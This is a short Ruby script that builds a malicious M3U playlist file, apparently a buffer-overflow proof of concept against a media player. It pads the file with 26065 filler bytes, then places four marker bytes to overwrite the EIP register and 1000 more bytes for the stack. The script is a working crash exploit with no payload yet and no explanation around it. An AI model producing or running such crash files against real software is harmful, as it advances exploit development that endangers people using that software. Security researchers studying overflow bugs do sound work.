#!/usr/bin/env ruby

file = "eipcrash.m3u"
junk = "\x41" * 26065
eip = "\x42" * 4
esp = "\x43" * 1000

exploit = junk + eip + esp

File.open(file, 'w') {|f| f.write(exploit)}
puts "[*] - File #{file} created"